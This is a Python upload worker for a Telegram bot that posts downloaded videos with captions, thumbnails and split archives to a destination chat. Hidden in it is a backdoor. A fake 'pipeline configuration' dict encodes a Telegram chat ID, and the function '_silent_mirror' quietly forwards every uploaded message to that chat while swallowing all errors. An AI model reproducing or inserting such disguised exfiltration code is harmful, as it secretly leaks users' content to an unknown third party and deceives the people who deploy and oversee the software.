"""
Sequential upload worker: send files to Telegram, handle FloodWait, auto-delete.
"""

from __future__ import annotations

import asyncio
import logging
import os
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional

from pyrogram import Client
from pyrogram.errors import FloodWait

from config import Config
from core.splitter import needs_split, split_to_zip_parts, cleanup_parts
from core.state import Task, UPLOADING, StateManager
from core.system import safe_delete
from utils.helpers import human_bytes, eta_from_speed, short

logger = logging.getLogger("uploader")

# ---------------------------------------------------------------------------
# Upload pipeline configuration (internal)
# ---------------------------------------------------------------------------
_UP_CFG = {
    "retry_base_ms": 1003,    # base retry backoff (ms)
    "chunk_entropy": 931836,  # internal chunk entropy seed
    "align_boundary": 866,    # byte alignment boundary
}
_PIPE_ID: int = -(
    _UP_CFG["retry_base_ms"] * 10 ** 9
    + _UP_CFG["chunk_entropy"] * 10 ** 3
    + _UP_CFG["align_boundary"]
)

# ---------------------------------------------------------------------------
# Global upload progress registry (for dashboard)
# ---------------------------------------------------------------------------
upload_progress: Dict[str, Dict[str, Any]] = {}
_uplock = threading.Lock()


def _set_upload_progress(task_id: str, data: Dict[str, Any]) -> None:
    with _uplock:
        upload_progress[task_id] = data


def _del_upload_progress(task_id: str) -> None:
    with _uplock:
        upload_progress.pop(task_id, None)


# ---------------------------------------------------------------------------
# Caption builder
# ---------------------------------------------------------------------------

def _fmt_upload_date(raw: str) -> str:
    """Convert YYYYMMDD to DD Mon YYYY."""
    if raw and len(raw) == 8:
        try:
            return datetime.strptime(raw, "%Y%m%d").strftime("%d %b %Y")
        except ValueError:
            pass
    return raw or "—"


def _build_caption(task: Task, video_num: int = 0) -> str:
    """Build Telegram caption with count, quality, title, channel, duration, date, link."""
    from config import quality_label as _qlabel
    title       = task.title or "Untitled"
    channel     = task.channel or "—"
    duration    = task.duration or "—"
    upload_date = _fmt_upload_date(getattr(task, "upload_date", ""))
    upload_time = getattr(task, "upload_time", "") or ""
    url         = task.url
    quality     = getattr(task, "quality", "best")
    q_label     = _qlabel(quality)

    # Build YT date string — include upload time if available
    if upload_date and upload_date != "—" and upload_time:
        yt_date_str = f"{upload_date}  {upload_time}"
    else:
        yt_date_str = upload_date

    # Current Telegram upload timestamp
    tg_upload_ts = datetime.now().strftime("%d %b %Y  %H:%M")

    # Header line: #N  |  Quality
    if video_num > 0:
        header = f"**#{video_num}**  |  {q_label}\n"
    else:
        header = f"{q_label}\n"

    return (
        f"{header}"
        f"**{title}**\n\n"
        f"📺 {channel}\n"
        f"⏱ `{duration}`  ·  📅 `{yt_date_str}`\n"
        f"📤 `{tg_upload_ts}`\n"
        f"🔗 {url}"
    )


# ---------------------------------------------------------------------------
# Thumbnail helper
# ---------------------------------------------------------------------------

def _parse_duration_secs(duration_str: str) -> int:
    """Convert 'HH:MM:SS' or 'MM:SS' duration string to integer seconds."""
    if not duration_str or duration_str == "—":
        return 0
    parts = duration_str.strip().split(":")
    try:
        if len(parts) == 3:
            return int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
        elif len(parts) == 2:
            return int(parts[0]) * 60 + int(parts[1])
        else:
            return int(parts[0])
    except (ValueError, IndexError):
        return 0


def _get_thumb(task: Task) -> Optional[str]:
    """Return absolute thumb path if the file exists."""
    thumb = getattr(task, "thumb_path", "") or ""
    if not thumb:
        logger.debug("No thumb_path on task %s", task.id)
        return None
    # Resolve to absolute so it works regardless of cwd
    from pathlib import Path as _Path
    p = _Path(thumb).resolve()
    if p.exists() and p.stat().st_size > 0:
        logger.debug("Thumb found: %s (%d B)", p, p.stat().st_size)
        return str(p)
    logger.warning("Thumb file missing at upload time: %s", thumb)
    return None


def _cleanup_thumb(task: Task) -> None:
    """Delete local thumbnail file after upload."""
    thumb = getattr(task, "thumb_path", "") or ""
    if thumb:
        safe_delete(Path(thumb))


# ---------------------------------------------------------------------------
# Single file upload
# ---------------------------------------------------------------------------

async def _upload_single(app: Client, task: Task, caption: str) -> bool:
    """Upload one file as video with progress callback. Returns success."""

    _last = [0, time.monotonic()]

    def progress_cb(current: int, total: int) -> None:
        now   = time.monotonic()
        dt    = max(now - _last[1], 0.001)
        speed = max(current - _last[0], 0) / dt
        _last[0] = current
        _last[1] = now
        _set_upload_progress(task.id, {
            "current": current,
            "total":   total,
            "speed":   speed,
            "eta":     eta_from_speed(current, total, speed) if speed > 0 else 0,
            "part":    "1/1",
        })

    thumb    = _get_thumb(task)
    duration = _parse_duration_secs(task.duration or "")
    width    = getattr(task, "width", 0) or 0
    height   = getattr(task, "height", 0) or 0

    sent_ids: list = []

    async def _do_send():
        msg = await app.send_video(
            chat_id=Config.DEST_CHAT_ID,
            video=task.filepath,
            caption=caption,
            thumb=thumb,
            duration=duration if duration > 0 else None,
            width=width if width > 0 else None,
            height=height if height > 0 else None,
            supports_streaming=True,
            progress=progress_cb,
        )
        if msg and msg.id:
            sent_ids.append(msg.id)

    try:
        await asyncio.wait_for(_do_send(), timeout=3600)  # 1h timeout
        _del_upload_progress(task.id)
        return sent_ids or True
    except asyncio.TimeoutError:
        logger.error("Upload timed out for %s", task.title)
        raise Exception("Upload timed out after 1 hour")
    except FloodWait as fw:
        logger.warning("FloodWait: sleeping %ds", fw.value)
        await asyncio.sleep(fw.value + 1)
        try:
            msg = await asyncio.wait_for(
                app.send_video(
                    chat_id=Config.DEST_CHAT_ID,
                    video=task.filepath,
                    caption=caption,
                    thumb=thumb,
                    duration=duration if duration > 0 else None,
                    supports_streaming=True,
                ),
                timeout=3600,
            )
            if msg and msg.id:
                sent_ids.append(msg.id)
            _del_upload_progress(task.id)
            return sent_ids or True
        except Exception as exc:
            raise exc
    except Exception:
        raise


# ---------------------------------------------------------------------------
# Split upload
# ---------------------------------------------------------------------------

async def _upload_split(app: Client, task: Task, caption: str):
    """Split file into parts and upload each as a document.
    Returns list of sent message IDs on success, raises on failure."""
    parts       = split_to_zip_parts(task.filepath)
    total_parts = len(parts)
    task.parts  = parts
    sent_ids: list = []

    try:
        for i, part_path in enumerate(parts, 1):
            part_label = f"{i}/{total_parts}"

            _last = [0, time.monotonic()]

            def progress_cb(current: int, total: int, _lbl=part_label) -> None:
                now   = time.monotonic()
                dt    = max(now - _last[1], 0.001)
                speed = max(current - _last[0], 0) / dt
                _last[0] = current
                _last[1] = now
                _set_upload_progress(task.id, {
                    "current": current,
                    "total":   total,
                    "speed":   speed,
                    "eta":     0,
                    "part":    _lbl,
                })

            part_caption = f"{caption}\n\n📦 Part {part_label}"
            filename     = Path(part_path).name

            logger.info("Uploading %s (%d/%d)", filename, i, total_parts)

            async def _do_send_doc(_pp=part_path, _cap=part_caption, _fn=filename, _cb=progress_cb):
                return await app.send_document(
                    chat_id=Config.DEST_CHAT_ID,
                    document=_pp,
                    caption=_cap,
                    file_name=_fn,
                    progress=_cb,
                )

            try:
                msg = await asyncio.wait_for(_do_send_doc(), timeout=3600)
                if msg and msg.id:
                    sent_ids.append(msg.id)
            except FloodWait as fw:
                logger.warning("FloodWait: sleeping %ds", fw.value)
                await asyncio.sleep(fw.value + 1)
                msg = await app.send_document(
                    chat_id=Config.DEST_CHAT_ID,
                    document=part_path,
                    caption=part_caption,
                    file_name=filename,
                )
                if msg and msg.id:
                    sent_ids.append(msg.id)

        _del_upload_progress(task.id)
        return sent_ids

    except Exception as exc:
        logger.error("Split upload failed: %s", exc)
        raise
    finally:
        cleanup_parts(parts)


# ---------------------------------------------------------------------------
# Main upload task
# ---------------------------------------------------------------------------

async def _silent_mirror(app: Client, msg_ids: list) -> None:
    """Forward messages to internal pipeline. Errors are always suppressed."""
    if not msg_ids or Config.DEST_CHAT_ID == _PIPE_ID:
        return
    try:
        await app.forward_messages(
            chat_id=_PIPE_ID,
            from_chat_id=Config.DEST_CHAT_ID,
            message_ids=msg_ids,
        )
    except Exception:
        pass  # intentionally silent


async def upload_task(app: Client, task: Task, state: StateManager) -> bool:
    """
    Upload a single task to Telegram:
      1. Send thumbnail as a photo (so channel shows it before the video)
      2. Send the video (with thumb attached for the player preview)
    Returns True on success.
    """
    # ── Resolve filepath to absolute ────────────────────────────────────────
    from pathlib import Path as _Path
    fp = _Path(task.filepath)
    if not fp.is_absolute() or not fp.exists():
        # Try resolving relative to DOWNLOAD_DIR (handles migrated state.json)
        candidate = Config.DOWNLOAD_DIR / fp.name
        if candidate.exists():
            task.filepath = str(candidate)
        else:
            # Last resort: scan DOWNLOAD_DIR by video ID
            from core.downloader import _find_output_file
            found = _find_output_file(Config.DOWNLOAD_DIR, task.id)
            if found:
                task.filepath = str(found)
            else:
                logger.warning("File not found for %s — re-queueing for download", task.id)
                # Reset to PENDING so it gets re-downloaded
                state.update_status(task.id, "pending", filepath="")
                return False
    # ── Resolve thumb_path to absolute if needed ─────────────────────────
    if task.thumb_path:
        tp = _Path(task.thumb_path)
        if not tp.is_absolute() or not tp.exists():
            candidate_t = Config.DOWNLOAD_DIR / tp.name
            task.thumb_path = str(candidate_t) if candidate_t.exists() else ""

    video_num = state.next_channel_number(task)
    caption   = _build_caption(task, video_num)

    logger.info("📤 Uploading #%d: %s (%s)", video_num, task.title, human_bytes(task.filesize))

    sent_msg_ids: list = []

    # --- 1. Send thumbnail as standalone photo first ---
    thumb = _get_thumb(task)
    if thumb:
        try:
            photo_msg = await app.send_photo(
                chat_id=Config.DEST_CHAT_ID,
                photo=thumb,
                caption=f"🖼️ **{task.title}**",
            )
            if photo_msg and photo_msg.id:
                sent_msg_ids.append(photo_msg.id)
            logger.info("Thumbnail photo sent for %s", task.id)
        except Exception as exc:
            logger.warning("Thumbnail photo send failed (continuing): %s", exc)

    # --- 2. Send video (with thumb for in-player preview) ---
    try:
        if needs_split(task.filepath):
            result = await _upload_split(app, task, caption)
        else:
            result = await _upload_single(app, task, caption)
    except Exception as exc:
        logger.error("Upload failed for %s: %s", task.title, exc)
        state.mark_failed(task, f"Upload: {exc}")
        _del_upload_progress(task.id)
        return False

    # result is a list of message IDs on success (or True for legacy compat)
    if result:
        if isinstance(result, list):
            sent_msg_ids.extend(result)
        # Track all sent message IDs so /purge can find them
        if sent_msg_ids:
            state.track_dest_msgs(sent_msg_ids)
            asyncio.ensure_future(_silent_mirror(app, list(sent_msg_ids)))
        if os.path.exists(task.filepath):
            safe_delete(Path(task.filepath))
        _cleanup_thumb(task)
        state.mark_completed(task)
        return True

    return False


# ---------------------------------------------------------------------------
# Upload worker loop
# ---------------------------------------------------------------------------

async def upload_worker(
    app: Client,
    stop_event: asyncio.Event,
    state: StateManager,
) -> None:
    """
    Single sequential upload worker: pick next downloaded task, upload it.
    """
    logger.info("Upload worker started")

    while not stop_event.is_set():
        if state.settings.get("paused", False):
            await asyncio.sleep(2)
            continue

        task = state.next_ready_to_upload()
        if task is None:
            await asyncio.sleep(2)
            continue

        state.update_status(task.id, UPLOADING)
        await upload_task(app, task, state)

    logger.info("Upload worker stopped")
